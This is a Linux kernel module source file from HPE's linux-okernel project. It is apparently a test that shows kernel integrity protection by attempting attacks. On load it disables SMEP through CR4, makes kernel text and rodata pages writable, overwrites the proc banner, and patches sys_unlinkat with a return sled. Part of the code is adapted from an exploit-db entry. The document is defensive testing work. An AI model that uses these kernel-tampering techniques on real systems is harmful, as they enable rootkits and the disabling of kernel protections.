/*
 Copyright [2015-2017] Hewlett Packard Enterprise Development LP

This program is free software; you can redistribute it and/or modify it under the terms 
of version 2 of the GNU General Public License as published by the Free Software Foundation.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; 
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program; 
if not, write to:
  Free Software Foundation, Inc.
  51 Franklin Street, Fifth Floor
  Boston, MA 02110-1301, USA.
*/

/*
 * This program incorporates some code by "rebel" from:
 *  https://www.exploit-db.com/exploits/40871/
 */


#include <linux/device.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <asm/current.h>
#include <asm/pgtable.h>
#include <asm-generic/sections.h>


/*
 * Attempt to write kernel memory to demonstrate okernel protection
 */
void oktargets(unsigned long (*address)[]);
#define BUFFMAX 1000
#define PG_BIT 20
#define RETQ_SLED (unsigned long) 0xc3c3c3c3c3c3c3c3
#define USE_TEXT_POKE

static size_t len_banner;
static unsigned long mod_start = (unsigned long)PFN_ALIGN(MODULES_VADDR);
static unsigned long mod_end = (unsigned long)PFN_ALIGN(MODULES_END);
static unsigned long targets[20];
static unsigned long kw_text;
static unsigned long kw_etext;
static unsigned long kw__start_rodata;
static unsigned long kw__end_rodata;
static int (*kw_set_memory_rw)(unsigned long addr, int numpages);
static void (*kw_flush_tlb_all)(void);
static void *(*kw_text_poke)(void *addr, const void *opcode, size_t len);
static void (*kw_flush_tlb_kernel_range)(unsigned long start, unsigned long end);
static long (*kw_sys_unlinkat)(int dfd, const char __user * pathname, int flag);
struct mutex *kw_text_mutex;
static char *kw_linux_proc_banner;
static char old_banner[BUFFMAX];

static const char *patched_banner = "Successfully patched linux_proc_banner\n";
static const unsigned long pgmask = ~(((unsigned long)1 << PG_BIT) - 1);
static const unsigned long psize = ((unsigned long)1 << PG_BIT);

static volatile unsigned long patched_code[2];

static void __init get_targets(void)
{
	printk("kwriter pgmask %#lx\n", pgmask);
	printk("kwriter invoking oktargets %#lx\n", (unsigned long) oktargets);
	oktargets(&targets);
	printk("kwriter returned from oktargets\n");
	kw_text = targets[0];
	kw_etext = targets[1];
	kw__start_rodata = targets[2];
	kw__end_rodata = targets[3];
	kw_set_memory_rw = (int (*)(unsigned long, int))targets[4];
	kw_flush_tlb_all =  (void (*)(void))targets[5];
	kw_linux_proc_banner = (char *)targets[6];
	kw_text_poke = (void *(*)(void *, const void *, size_t))targets[7];
	kw_text_mutex = (struct mutex *)targets[8];
	kw_flush_tlb_kernel_range =
		(void (*)(unsigned long, unsigned long))targets[9];
	kw_sys_unlinkat = (long (*)(int, const char *, int))targets[10];

	printk(KERN_INFO "kwriter _text %#lx\n", kw_text);
	printk(KERN_INFO "kwriter _etext %#lx\n", kw_etext);
	printk(KERN_INFO "kwriter __start_rodata va %#lx\n", kw__start_rodata);
	printk(KERN_INFO "kwriter __end_rodata va %#lx\n", kw__end_rodata);
	printk(KERN_INFO "kwriter set_memory_rw %#lx\n",
	       (unsigned long) kw_set_memory_rw);
	printk(KERN_INFO "kwriter linux_proc_banner %s\n", kw_linux_proc_banner);
	printk(KERN_INFO "kwriter linux_proc_banner va %#lx\n",
	       (unsigned long) kw_linux_proc_banner);
	printk(KERN_INFO "kwriter module space start va %#lx\n", mod_start);
	printk(KERN_INFO "kwriter module space end va %#lx\n", mod_end);
	printk(KERN_INFO "kwriter flush_tlb_kernel_range %#lx\n",
	       (unsigned long) kw_flush_tlb_kernel_range);
	printk(KERN_INFO "kwriter sys_unlinkat %#lx\n",
	       (unsigned long) kw_sys_unlinkat);
}

static void check_va(unsigned long va)
{
	pte_t *kpte;
	unsigned int level;
	pgprot_t prot;

	printk(KERN_INFO "oktest checking guest physical pg perms for va %#lx",
	       va);
	kpte = lookup_address(va, &level);
	if (!kpte){
		printk(KERN_CONT "address not found in guest page tables\n");
		return;
	}
	prot = pte_pgprot(*kpte);
	if (pgprot_val(prot) & pgprot_val(__pgprot(_PAGE_NX)))
		printk(KERN_CONT " NX is set");
	if (pgprot_val(prot) & pgprot_val(__pgprot(_PAGE_RW)))
		printk(KERN_CONT " RW is set");
	printk("\n");
}

static void set_mem_rw(unsigned long va)
{	pte_t *kpte, old_pte, new_pte;
	unsigned int level;
	pgprot_t new_prot;
	unsigned long pfn;

	kpte = lookup_address(va, &level);
	printk(KERN_INFO "kwriter set_mem_rw va %#lx ", va);
	if (level == PG_LEVEL_4K) {
		printk(KERN_CONT "4k page\n");
	}
	if (level == PG_LEVEL_2M) {
		printk(KERN_CONT "2M page\n");
	}
	if (!kpte){
		printk(KERN_CONT "kpte null\n");
		return;
	}
	old_pte = *kpte;
	if (pte_none(old_pte)) {
		printk(KERN_INFO "kwriter set_mem_rw va %#lx not mapped?\n", va);
		return;
	}
	pfn = pte_pfn(old_pte);
	new_prot = pte_pgprot(old_pte);
	pgprot_val(new_prot) |= pgprot_val(__pgprot(_PAGE_RW));
	new_pte = pfn_pte(pfn, new_prot);
	set_pte_atomic(kpte, new_pte);
	kw_flush_tlb_all();
	kw_flush_tlb_kernel_range(va, va + psize);

	return;
}

static void update_banner(void)
{
	unsigned long va = ((unsigned long)kw_linux_proc_banner) & pgmask;

	if (!(strncpy(old_banner, kw_linux_proc_banner, BUFFMAX))) {
		printk(KERN_INFO "kwriter failed to save banner\n");
		return;
	}
	printk(KERN_INFO "Calling set_mem_rw");
	set_mem_rw(va);
	check_va(va);
	printk(KERN_INFO "Checking we can still read linux_proc_banner %s\n",
	       kw_linux_proc_banner);
	len_banner = strlen(kw_linux_proc_banner) + 1;
	printk(KERN_INFO "kwriter patching linux_proc_banner len is %ld bytes\n",
		len_banner);
	if (len_banner > BUFFMAX)
		len_banner = BUFFMAX;
	if (!(strncpy(kw_linux_proc_banner, patched_banner, len_banner))) {
 		printk(KERN_INFO "kwriter patching banner failed\n");
		return;
	}
	printk(KERN_INFO "kwriter linux_proc_banner %s\n", kw_linux_proc_banner);
}

static void poke_addresses(unsigned long start, unsigned long end)
{
	unsigned long s = PFN_ALIGN(start);
	unsigned long e = PFN_ALIGN(end);
	volatile unsigned long va, target, *p;
	for(va = s; va < e; va += psize) {
		set_mem_rw(va);
		check_va(va);
		p = (unsigned long *) va;
		target = *p;
		*p = target;
	}
}

#ifdef USE_TEXT_POKE
 static void patch_fn(unsigned long *va)
 {
 	size_t n;
	volatile unsigned long sled[2];
	printk(KERN_INFO "kwriter attempting to get text_mutex\n");
	if (!mutex_trylock(kw_text_mutex)) {
		printk(KERN_INFO "kwriter Unable to get text_mutex\n");
		goto end;
 	}
	printk(KERN_INFO "kwriter Got text_mutex\n");
 	printk(KERN_INFO "kwriter attempting to patch %#lx", (unsigned long)va);
	n = sizeof(patched_code);
	patched_code[0] = va[0];
	patched_code[1] = va[1];
	sled[0] = RETQ_SLED;
	sled[1] = RETQ_SLED;
	kw_text_poke((void *)va, (void *)sled, n);
end:
	mutex_unlock(kw_text_mutex);
 }

 static void unpatch_fn(unsigned long *va)
 {
 	size_t n;
	printk(KERN_INFO "kwriter attempting to get text_mutex\n");
	if (!mutex_trylock(kw_text_mutex)) {
		printk(KERN_INFO "kwriter Unable to get text_mutex\n");
		goto end;
 	}
	printk(KERN_INFO "kwriter Got text_mutex\n");
 	printk(KERN_INFO "kwriter attempting to patch %#lx", (unsigned long)va);
	n = sizeof(patched_code);
	kw_text_poke((void *)va, (void *)patched_code, n);
end:
	mutex_unlock(kw_text_mutex);
 }

#else

static void print_bytes(unsigned char *p, int n)
{
	int i;
	for(i = 0; i < n; i++) 
		printk(KERN_CONT "%02X ", p[i]);
	printk(KERN_CONT "\n");
}

static void patch_fn(unsigned long *va)
{
	printk(KERN_INFO "patch_fn %#lx has ", (unsigned long) va);
	print_bytes((unsigned char *)va, 16);
	printk(KERN_CONT "\n");
	set_mem_rw((unsigned long)va);
	check_va((unsigned long)va);
	patched_code[0] = va[0];
	patched_code[1] = va[1];
	printk(KERN_INFO "patch_fn saving ");
	print_bytes((unsigned char *) patched_code, 16);
	va[0] = RETQ_SLED;
	va[1] = RETQ_SLED;
	printk(KERN_INFO "patch_fn %#lx now has ", (unsigned long) va);
	print_bytes((unsigned char *)va, 16);
}

static void unpatch_fn(unsigned long *va)
{
	printk(KERN_INFO "un_patch_fn %#lx has ", (unsigned long) va);
	print_bytes((unsigned char *)va, 16);
	printk(KERN_CONT "\n");
	set_mem_rw((unsigned long)va);
	check_va((unsigned long)va);
	va[0] = patched_code[0];
	va[1] = patched_code[1];
	printk(KERN_INFO "unpatch_fn at %#lx now has ", (unsigned long) va);
	print_bytes((unsigned char *)va, 16);
}
#endif

static int __init kwriter_module_init(void)
{
	unsigned long cr4;

	printk ("kwriter: loading module...\n");
	printk("kwriter: trying to disable SMEP\n");
	cr4 = native_read_cr4();
	printk("kwriter: CR4 is currently set to %#lx\n", cr4);
	cr4 = cr4 & ~X86_CR4_SMEP;
	native_write_cr4(cr4);
	printk("kwriter: Finished attempt to disable SMEP by writing %#lx to CR4\n", cr4);
	get_targets();
	update_banner();
	poke_addresses(kw__start_rodata, kw__start_rodata + (psize * 3));
	poke_addresses(kw__end_rodata - (psize * 3), kw__end_rodata);
	poke_addresses(kw_text, kw_text + (psize * 3));
	poke_addresses(kw_etext - (psize * 3), kw_etext);
	patch_fn((unsigned long *)kw_sys_unlinkat);
	
	printk(KERN_INFO "kwriter done __init\n");
	return 0;
}

static void __exit kwriter_module_exit(void)
{
	unsigned long va = (unsigned long)kw_linux_proc_banner;

	printk("kwriter: unloading");
	printk(KERN_INFO "Calling set_mem_rw");
	set_mem_rw(va);
	check_va(va);
	if (!(strncpy(kw_linux_proc_banner, old_banner, len_banner))) {
		printk(KERN_INFO "kwriter failed to restor banner\n");
		return;
	}
	unpatch_fn((unsigned long *)kw_sys_unlinkat);
	printk("kwriter: done.\n");
	return;
}

module_init(kwriter_module_init);
module_exit(kwriter_module_exit);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nigel Edwards");
MODULE_DESCRIPTION("Demonstrate linux-okernel kernel integrity protection.");
